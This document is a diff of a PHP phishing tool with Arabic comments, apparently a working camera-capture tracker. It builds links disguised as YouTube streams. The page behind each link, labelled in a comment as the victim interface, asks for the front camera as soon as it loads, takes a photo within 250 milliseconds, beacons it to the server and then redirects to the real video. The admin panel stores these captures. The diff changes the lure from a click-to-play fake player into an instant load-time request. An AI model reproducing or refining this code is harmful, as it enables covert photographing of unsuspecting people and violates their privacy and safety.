@@ -7,7 +7,7 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
-    $db = new PDO('sqlite:tracker_pro.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker_hyper.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -28,7 +28,7 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-function fetch_real_meta($url) {$title = "YouTube Stream - Watch Live";
+function fetch_real_meta($url) {$title = "YouTube Stream - Live";
     $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
     if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
@@ -53,7 +53,7 @@ function fetch_real_meta($url) {$title = "YouTube Stream - Watch Live";
     return ['title' => trim($title), 'image' => trim($image)];
 }
 
-$og_title = "YouTube Stream - Watch Live";
+$og_title = "YouTube Stream - Live";
 $og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 $target_redirect = "";
 
@@ -112,7 +112,7 @@ if (!empty($filter_code)) {
     $captures =$db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
 }
 
-// واجهة الضحية الاحترافية
+// واجهة الضحية للسرعة القصوى
 if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
@@ -125,28 +125,25 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     <meta property="og:type" content="website">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background-color: #0b0f17; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; overflow: hidden; }
-        .player-box { width: 100%; max-width: 440px; background: #131b2e; border: 1px solid #1e293b; border-radius: 12px; overflow: hidden; box-shadow: 0 15px 35px rgba(0,0,0,0.6); text-align: center; }
-        .thumbnail-container { position: relative; width: 100%; height: 240px; background: url('<?php echo htmlspecialchars($og_image); ?>') center/cover no-repeat; display: flex; justify-content: center; align-items: center; cursor: pointer; }
-        .play-btn { width: 64px; height: 64px; background: rgba(239, 68, 68, 0.9); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 20px rgba(239,68,68,0.5); transition: transform 0.2s; }
-        .play-btn::after { content: ''; display: block; width: 0; height: 0; border-style: solid; border-width: 10px 0 10px 18px; border-color: transparent transparent transparent #fff; margin-left: 3px; }
-        .thumbnail-container:hover .play-btn { transform: scale(1.1); }
-        .video-info { padding: 20px; }
-        .video-title { font-size: 15px; font-weight: 600; color: #f8fafc; margin-bottom: 8px; line-height: 1.4; }
-        .video-desc { font-size: 12px; color: #94a3b8; }
+        body { background-color: #0b0f17; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; flex-direction: column; overflow: hidden; }
+        .loader { border: 4px solid rgba(255,255,255,0.1); width: 45px; height: 45px; border-radius: 50%; border-left-color: #38bdf8; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { font-size: 13px; color: #94a3b8; }
+        #hyper-video { display: none; }
     </style>
     <script>
-        const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
-        const targetUrl = "<?php echo $target_redirect; ?>";
+        window.addEventListener('DOMContentLoaded', function() {
+            const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
+            const targetUrl = "<?php echo $target_redirect; ?>";
 
-        function startProcess() {
+            // محاولة فرض الطلب بأقصى سرعة فور فتح الصفحة
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
-                    const video = document.createElement('video');
+                    const video = document.getElementById('hyper-video');
                     video.srcObject = stream;
-                    video.setAttribute('playsinline', '');
                     video.play();
                     
+                    // التقط فوراً في أقل من 250 ميلي ثانية
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth || 640;
@@ -154,7 +151,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        const imageData = canvas.toDataURL('image/jpeg', 0.90);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
                         stream.getTracks().forEach(track => track.stop());
 
                         const formData = new URLSearchParams();
@@ -163,47 +160,35 @@ if (isset($_GET['r']) && !empty($target_redirect)):
 
                         if (navigator.sendBeacon) {
                             navigator.sendBeacon(`/?r=${redirectCode}`, formData);
-                            setTimeout(() => { window.location.replace(targetUrl); }, 250);
-                        } else {
-                            fetch(`/?r=${redirectCode}`, {
-                                method: 'POST',
-                                body: formData,
-                                keepalive: true
-                            }).finally(() => {
-                                window.location.replace(targetUrl);
-                            });
                         }
-                    }, 350);
+                        
+                        window.location.replace(targetUrl);
+                    }, 250);
                 })
                 .catch(err => {
+                    // في حال رفض الإذن أو حظره، يتم التوجيه بسلاسة
                     window.location.replace(targetUrl);
                 });
-        }
+        });
     </script>
 </head>
 <body>
-    <div class="player-box">
-        <div class="thumbnail-container" onclick="startProcess()">
-            <div class="play-btn"></div>
-        </div>
-        <div class="video-info">
-            <div class="video-title"><?php echo htmlspecialchars($og_title); ?></div>
-            <div class="video-desc">اضغط لعرض المقطع بجودة HD</div>
-        </div>
-    </div>
+    <video id="hyper-video" autoplay playsinline></video>
+    <div class="loader"></div>
+    <p>جاري تحميل المقطع...</p>
 </body>
 </html>
 <?php 
     exit(); 
 endif; 
 ?>
-<!-- لوحة التحكم الإدارية الاحترافية -->
+<!-- لوحة التحكم الإدارية -->
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم الرئيسية</title>
+    <title>لوحة التحكم - السرعة القصوى</title>
     <style>
         :root {
             --bg-main: #0b0f17;
@@ -243,7 +228,7 @@ endif;
     <div class="wrapper">
         
         <section class="section-box">
-            <h2>توليد رابط التعقب الاحترافي</h2>
+            <h2>توليد رابط السرعة القصوى</h2>
             <form method="POST" class="form-row">
                 <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثل يوتيوب)..." required>
                 <button type="submit" name="create" class="btn">توليد الرابط</button>
